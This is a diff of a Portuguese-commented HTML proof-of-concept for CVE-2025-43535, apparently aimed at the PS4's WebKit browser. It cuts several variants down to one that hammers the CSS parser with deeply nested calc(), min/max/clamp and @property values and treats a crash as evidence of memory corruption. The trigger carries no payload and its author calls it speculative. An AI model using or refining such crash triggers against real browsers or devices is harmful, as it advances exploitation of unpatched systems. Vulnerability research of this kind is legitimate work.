@@ -1,38 +1,8 @@
-﻿<!DOCTYPE html>
-<!--
-  PoC: CVE-2025-43535
-  Tipo: Memory Corruption — WebKit WebCore  
-  Pesquisadores: Google Big Sleep (DeepMind AI fuzzer) + Nan Wang (@eternalsakura13)
-  Fix: "improved memory handling" (Bugzilla 300774 + 301338 — DOIS bugs)
-  Advisory: Safari 26.2, Dezembro 2025
-  
-  HIPÓTESE DO COMPONENTE:
-  Google Big Sleep é o AI fuzzer do DeepMind que encontrou bugs em:
-  - Parsers de formato (libc, compiladores, JSON, XML, HTML)
-  - Dois Bugzilla IDs = mesma CLASSE de bug em dois lugares do código
-  
-  Nan Wang co-descobriu → intersecção das áreas deles:
-  CSS Layout + Parser/Decoder = CSS parsing com valores específicos
-  
-  Candidatos mais prováveis para "dois lugares do mesmo bug":
-  a) CSS selector parser — recursão excessiva / OOB em parser stack
-  b) CSS value parsing — buffer de tokens com overflow
-  c) HTML parser — table/form nesting rules com estado incorreto
-  d) WebKit style resolver com custom properties (@property) recursão
-  e) CSS @supports / @media com queries aninhadas
-  
-  ESTRATÉGIA:
-  Focar em parsers que aceitam input complexo/aninhado:
-  1. CSS @property com custom properties complexas
-  2. CSS selector aninhamento profundo
-  3. HTML parser com nesting patológico (table-in-table, etc.)
-  4. CSS calc() e math functions aninhadas
-  5. CSS @container / @layer queries aninhadas
--->
+<!DOCTYPE html>
 <html>
 <head>
 <meta charset="UTF-8">
-<title>CVE-2025-43535 PoC — Memory Corruption Parser (Google Big Sleep)</title>
+<title>CVE-2025-43535 PoC — V1 Isolada</title>
 <style>
   body { background:#0a0a0a; color:#88ff88; font-family:monospace; padding:16px; }
   #log { background:#111; border:1px solid #88ff88; padding:12px;
@@ -41,385 +11,119 @@
 </style>
 </head>
 <body>
-<h3>CVE-2025-43535 — Memory Corruption Parser/Layout (Google Big Sleep AI)</h3>
+<h3>CVE-2025-43535 — Memory Corruption Parser/Layout (CSS Math)</h3>
 <div id="log"></div>
 
 <script>
 "use strict";
+
 const L=(m,c)=>{const d=document.getElementById('log');
   d.innerHTML+=`<div class="${c||'info'}">[${Date.now()%100000}] ${m}</div>`;
-  d.scrollTop=d.scrollHeight;};
+  d.scrollTop=d.scrollHeight;
+};
 
-L("=== CVE-2025-43535 PoC Iniciado ===");
+// Pausa para permitir que o Event Loop e o GC do WebKit respirem, evitando DoS por OOM
+const yieldGC = () => new Promise(r => setTimeout(r, 15));
 
-// =============================================================
-// VARIANTE 1: CSS calc() aninhado profundamente
-// AI fuzzers frequentemente encontram bugs em parsers recursivos
-// O parser de calc() tem limite de aninhamento, mas pode haver
-// off-by-one ou stack OOB na contagem
-// =============================================================
-function variant1_css_calc_deep() {
-  return new Promise(resolve => {
-    L("[V1] CSS calc() deep nesting + complex math...");
+L("=== CVE-2025-43535 PoC Iniciado (V1 Isolada) ===");
 
-    const el = document.createElement('div');
-    el.style.cssText = 'position:absolute;top:-9999px';
-    document.body.appendChild(el);
+async function variant1_css_calc_deep() {
+  L("[V1] CSS calc() deep nesting + complex math (Linear Growth)...");
 
-    const sheet = document.createElement('style');
-    document.head.appendChild(sheet);
+  const el = document.createElement('div');
+  el.style.cssText = 'position:absolute;top:-9999px';
+  document.body.appendChild(el);
 
-    // Gerar calc() aninhado em diferentes profundidades
-    function makeDeepcalc(depth, unit) {
-      if (depth <= 0) return `10${unit}`;
-      return `calc(${makeDeepcalc(depth-1, unit)} + ${depth}${unit})`;
-    }
+  const sheet = document.createElement('style');
+  document.head.appendChild(sheet);
 
-    // Testar profundidades variadas
-    const depths = [1];
-    const units = ['px', 'em', 'rem', '%', 'vw', 'vh', 'fr'];
+  // 1. Teste do calc() aninhado (Recursão Linear)
+  function makeDeepcalc(depth, unit) {
+    if (depth <= 0) return `10${unit}`;
+    return `calc(${makeDeepcalc(depth-1, unit)} + ${depth}${unit})`;
+  }
 
-    for (const depth of depths) {
-      for (const unit of units) {
-        try {
-          const calc = makeDeepcalc(depth, unit);
-          // Aplicar via stylesheet (usa CSS parser interno)
-          sheet.textContent = `div.test-calc { width: ${calc}; height: ${calc}; }`;
-          el.className = 'test-calc';
-          void el.offsetWidth;
-          // Aplicar inline também (outro code path do parser)
-          el.style.width = calc;
-          el.style.height = calc;
-          void el.offsetWidth;
-        } catch(e) { /* profundidade pode ser rejeitada */ }
-      }
-    }
+  // Como o stress no JS foi resolvido, podemos testar profundidades maiores no C++
+  const depths = [10, 50, 100, 200, 500]; 
+  const units = ['px', 'em', '%']; 
 
-    // CSS math functions aninhadas: min(), max(), clamp()
-    function makeMathNested(depth) {
-      if (depth <= 0) return '10px';
-      const funcs = ['min', 'max', 'clamp'];
-      const f = funcs[depth % 3];
-      
-      // MUDANÇA AQUI: Recursão apenas no primeiro argumento!
-      // Os outros argumentos recebem valores fixos, evitando a explosão exponencial O(2^n).
-      if (f === 'clamp') {
-        return `clamp(${makeMathNested(depth-1)}, ${depth*5}px, 100px)`;
-      }
-      return `${f}(${makeMathNested(depth-1)}, 15px)`;
-    }
-
-    // Agora você pode subir esse valor pra muito além de 27 sem dar OOM!
-    for (let d = 1; d <= 100; d++) {
+  for (const depth of depths) {
+    for (const unit of units) {
       try {
-        const expr = makeMathNested(d);
-        el.style.width = expr;
-        el.style.height = expr;
+        const calc = makeDeepcalc(depth, unit);
+        sheet.textContent = `div.test-calc { width: ${calc}; height: ${calc}; }`;
+        el.className = 'test-calc';
         void el.offsetWidth;
-      } catch(e) {}
-      
-      // Opcional: Pausa rápida a cada 20 iterações para o GC limpar as strings antigas
-      if (d % 20 === 0) await new Promise(r => setTimeout(r, 10)); 
+        
+        el.style.width = calc;
+        el.style.height = calc;
+        void el.offsetWidth;
+      } catch(e) { }
     }
+    await yieldGC(); // Respiro para o GC limpar as strings e nós de estilo órfãos
+  }
 
-    // CSS custom properties (@property) com initial-value complexo
-    for (let i = 0; i < 1; i++) {
-      try {
-        const propName = `--test-prop-${i}`;
-        // Registrar com CSS.registerProperty se disponível
-        if (typeof CSS !== 'undefined' && CSS.registerProperty) {
-          CSS.registerProperty({
-            name: propName,
-            syntax: '<length>',
-            inherits: true,
-            initialValue: makeDeepcalc(10, 'px'),
-          });
-        }
-        el.style.setProperty(propName, makeDeepcalc(20, 'px'));
-      } catch(e) {}
+  // 2. Teste das funções matemáticas (Corrigido para evitar explosão de RAM)
+  function makeMathNested(depth) {
+    if (depth <= 0) return '10px';
+    const funcs = ['min', 'max', 'clamp'];
+    const f = funcs[depth % 3];
+    
+    // Recursão apenas no primeiro argumento para manter crescimento O(n) e focar no parser stack
+    if (f === 'clamp') {
+      return `clamp(${makeMathNested(depth-1)}, ${depth*5}px, 100px)`;
     }
+    return `${f}(${makeMathNested(depth-1)}, 15px)`;
+  }
 
-    sheet.textContent = '';
-    document.head.removeChild(sheet);
-    document.body.removeChild(el);
-    L("[V1] CSS calc() deep nesting OK", "ok");
-    resolve();
-  });
-}
-
-// =============================================================
-// VARIANTE 2: HTML Parser — nesting patológico
-// Bugs clássicos de HTML parser: table-in-table,
-// form-in-form, elementos mal aninhados que ativam
-// tree construction algorithms especiais
-// =============================================================
-function variant2_html_parser_nesting() {
-  return new Promise(resolve => {
-    L("[V2] HTML parser pathological nesting...");
-
-    const parser = new DOMParser();
-
-    // Padrões de nesting que exercitam regras especiais do HTML5 parser
-    const patterns = [
-      // Table-in-table (foster parenting)
-      '<table><tr><td><table><tr><td>inner</td></tr></table></td></tr></table>',
-
-      // Form nesting (segundo form é tratado como fora do primeiro)
-      '<form><form><input><form><input></form></form></form>',
-
-      // Listas profundamente aninhadas
-      (() => {
-        let s = '';
-        for(let i=0;i<200;i++) s += '<ul><li>';
-        s += 'deep';
-        for(let i=0;i<200;i++) s += '</li></ul>';
-        return s;
-      })(),
-
-      // Elementos de heading interleaved
-      '<h1><h2><h3><h4><h5><h6>text</h6></h5></h4></h3></h2></h1>',
-
-      // Parágrafos com elementos block-level (força implicit close)
-      (() => {
-        let s = '<p>';
-        for(let i=0;i<100;i++) s += '<div><p>nested';
-        return s + '</p>';
-      })(),
-
-      // Select aninhado (proibido, parser deve lidar)
-      '<select><select><option>a</option></select><option>b</option></select>',
-
-      // Script tags em locais incomuns
-      '<table><script>var x=1;<\/script><tr><td>data</td></tr></table>',
-
-      // SVG dentro de table
-      '<table><tr><td><svg xmlns="http://www.w3.org/2000/svg"><rect/></svg></td></tr></table>',
-
-      // MathML dentro de HTML5 (força foreign content mode)
-      '<p>text<math xmlns="http://www.w3.org/1998/Math/MathML"><mrow><mi>x</mi><mo>+</mo><mn>1</mn></mrow></math></p>',
-    ];
-
-    for (let iter = 0; iter < 50; iter++) {
-      for (const pattern of patterns) {
-        try {
-          // Parse via DOMParser
-          const doc = parser.parseFromString(
-            `<!DOCTYPE html><html><body>${pattern}</body></html>`,
-            'text/html'
-          );
-          void doc.body.innerHTML;
-
-          // Parse via innerHTML (outro code path)
-          const div = document.createElement('div');
-          div.innerHTML = pattern;
-          void div.childNodes.length;
-
-          // Serializar e re-parsear (pode expor inconsistências)
-          const serialized = div.innerHTML;
-          const div2 = document.createElement('div');
-          div2.innerHTML = serialized;
-
-        } catch(e) { /* parser errors esperados */ }
-      }
-    }
-
-    // Stress test especial: innerHTML em loop com padrões que
-    // mudam radicalmente a estrutura da árvore
-    const container = document.createElement('div');
-    document.body.appendChild(container);
-
-    const structurePatterns = [
-      '<table><tbody><tr><td>A</td><td>B</td></tr></tbody></table>',
-      '<div><p>para<span>span</span></p></div>',
-      '<ul><li>1<li>2<li>3</ul>',
-      '<dl><dt>term<dd>def<dt>t2<dd>d2</dl>',
-      '<figure><img src="x"><figcaption>caption</figcaption></figure>',
-      '<details><summary>Sum</summary><p>Details content</p></details>',
-    ];
-
-    for (let i = 0; i < 500; i++) {
-      try {
-        container.innerHTML = structurePatterns[i % structurePatterns.length];
-        // Forçar layout no meio da mutação
-        if (i % 50 === 0) void container.offsetWidth;
-      } catch(e) {}
-    }
-
-    document.body.removeChild(container);
-    L("[V2] HTML parser nesting stress OK", "ok");
-    resolve();
-  });
-}
-
-// =============================================================
-// VARIANTE 3: CSS @layer + @container queries aninhadas
-// Novos recursos CSS com possíveis bugs no parser de regras
-// =============================================================
-function variant3_css_at_rules() {
-  return new Promise(resolve => {
-    L("[V3] CSS @layer + @container deep nesting...");
-
-    const sheet = document.createElement('style');
-    document.head.appendChild(sheet);
-
-    // @layer aninhadas
-    function makeLayerNested(depth) {
-      if (depth <= 0) return `.d${depth} { color: red; }`;
-      return `@layer l${depth} { ${makeLayerNested(depth-1)} .d${depth} { font-size: ${depth}px; } }`;
-    }
-
-    // @container aninhadas (CSS Container Queries)
-    function makeContainerNested(depth) {
-      if (depth <= 0) return `.inner { width: 100%; }`;
-      return `@container (min-width: ${depth*10}px) { ${makeContainerNested(depth-1)} }`;
-    }
-
-    // @supports aninhadas
-    function makeSupportsNested(depth) {
-      if (depth <= 0) return `.s { display: flex; }`;
-      return `@supports (display: flex) { ${makeSupportsNested(depth-1)} }`;
-    }
-
-    // @media aninhadas
-    function makeMediaNested(depth) {
-      if (depth <= 0) return `.m { color: blue; }`;
-      return `@media screen and (min-width: ${depth*10}px) { ${makeMediaNested(depth-1)} }`;
-    }
-
-    const depths = [2, 5, 10, 20, 50];
-    const generators = [makeLayerNested, makeContainerNested, makeSupportsNested, makeMediaNested];
-
-    for (const gen of generators) {
-      for (const depth of depths) {
-        try {
-          sheet.textContent = gen(depth);
-          // Forçar CSSOM parsing
-          void sheet.sheet?.cssRules?.length;
-        } catch(e) {}
-      }
-    }
-
-    // Combinação: layer + container + supports + media juntos
-    for (let i = 0; i < 100; i++) {
-      try {
-        sheet.textContent = `
-          @layer base, theme, utilities;
-          @layer base {
-            @supports (display: grid) {
-              @media (min-width: ${i*5}px) {
-                @container style(--x: ${i}) {
-                  .el-${i} {
-                    width: calc(${i}% + ${i*2}px);
-                    height: clamp(${i}px, ${i}%, ${i*3}px);
-                  }
-                }
-              }
-            }
-          }
-        `;
-        // Acessar CSSOM para forçar parse completo
-        const rules = sheet.sheet?.cssRules;
-        if (rules) {
-          for (const rule of rules) {
-            void rule.cssText;
-          }
-        }
-      } catch(e) {}
-    }
-
-    sheet.textContent = '';
-    document.head.removeChild(sheet);
-    L("[V3] CSS @rules nesting stress OK", "ok");
-    resolve();
-  });
-}
-
-// =============================================================
-// VARIANTE 4: CSS selector complexity
-// Selectores complexos podem causar OOB no parser stack
-// =============================================================
-function variant4_css_selector_complexity() {
-  return new Promise(resolve => {
-    L("[V4] CSS selector complexity stress...");
-
-    const sheet = document.createElement('style');
-    document.head.appendChild(sheet);
-
-    const pseudos = [':hover',':focus',':active',':visited',':first-child',
-      ':last-child',':nth-child(2n+1)',':nth-of-type(odd)',':not(.x)',
-      ':is(.a,.b,.c)',':has(.child)',':where(.x,.y)'];
-    const combinators = [' ', '>', '+', '~'];
-
-    // Gerar seletores muito longos e complexos
-    function makeComplexSelector(depth) {
-      if (depth <= 0) return 'div';
-      const comb = combinators[depth % combinators.length];
-      const pseudo = pseudos[depth % pseudos.length];
-      return `${makeComplexSelector(depth-1)}${comb}.el${depth}${pseudo}`;
-    }
-
-    for (let d = 1; d <= 30; d++) {
-      try {
-        const sel = makeComplexSelector(d);
-        sheet.textContent = `${sel} { color: red; }`;
-        void sheet.sheet?.cssRules?.length;
-        // document.querySelector() também parseia o seletor
-        try { document.querySelector(sel); } catch(e2) {}
-      } catch(e) {}
-    }
-
-    // :is() e :has() com listas longas de seletores
-    for (let n = 5; n <= 200; n += 5) {
-      try {
-        const list = Array.from({length: n}, (_,i) => `.el-${i}`).join(',');
-        sheet.textContent = `:is(${list}) { color: blue; }`;
-        void sheet.sheet?.cssRules?.length;
-
-        // :has() com múltiplos argumentos
-        sheet.textContent = `div:has(${list}) { display: block; }`;
-        void sheet.sheet?.cssRules?.length;
-
-        // :not() com lista
-        sheet.textContent = `div:not(${list}) { visibility: visible; }`;
-        void sheet.sheet?.cssRules?.length;
-      } catch(e) {}
-    }
-
-    // CSS Nesting (& selector) — novo recurso, possíveis bugs
+  // Subindo o limite drasticamente, pois agora a memória aguenta
+  L("[V1] Executando loop de profundidade math até 1000...");
+  for (let d = 1; d <= 1000; d++) {
     try {
-      function makeNesting(depth) {
-        if (depth <= 0) return 'color: red;';
-        return `& .level${depth} { ${makeNesting(depth-1)} font-size: ${depth}px; }`;
-      }
-      for (let d = 1; d <= 20; d++) {
-        sheet.textContent = `.root { ${makeNesting(d)} }`;
-        void sheet.sheet?.cssRules?.length;
-      }
+      const expr = makeMathNested(d);
+      el.style.width = expr;
+      el.style.height = expr;
+      void el.offsetWidth;
     } catch(e) {}
+    
+    if (d % 25 === 0) await yieldGC(); 
+  }
 
-    sheet.textContent = '';
-    document.head.removeChild(sheet);
-    L("[V4] CSS selector complexity stress OK", "ok");
-    resolve();
-  });
+  // 3. CSS custom properties (@property)
+  L("[V1] Registrando Custom Properties...");
+  for (let i = 0; i < 30; i++) {
+    try {
+      const propName = `--test-prop-${i}`;
+      if (typeof CSS !== 'undefined' && CSS.registerProperty) {
+        CSS.registerProperty({
+          name: propName,
+          syntax: '<length>',
+          inherits: true,
+          initialValue: makeDeepcalc(10, 'px'),
+        });
+      }
+      el.style.setProperty(propName, makeDeepcalc(20, 'px'));
+    } catch(e) {}
+    if (i % 5 === 0) await yieldGC();
+  }
+
+  // Limpeza final
+  sheet.textContent = '';
+  document.head.removeChild(sheet);
+  document.body.removeChild(el);
+  L("[V1] Testes do parser CSS concluídos", "ok");
 }
 
-// =============================================================
-// Executor
-// =============================================================
 async function main() {
   try {
     await variant1_css_calc_deep();
-    await variant2_html_parser_nesting();
-    await variant3_css_at_rules();
-    await variant4_css_selector_complexity();
-    L("=== COMPLETO ===", "ok");
-    L("Crash do browser = CVE-2025-43535 PRESENTE no PS4 13.04", "crash");
-    L("Sem crash = patched ou trigger precisa refinamento", "info");
+    L("=== EXECUÇÃO FINALIZADA ===", "ok");
+    L("Se o PS4 crashear agora, há grande chance de corrupção real no WebKit (não OOM).", "crash");
   } catch(e) {
     L("EXCEÇÃO FATAL: " + e.toString(), "fail");
   }
 }
+
 window.addEventListener('load', () => setTimeout(main, 300));
 </script>
 </body>
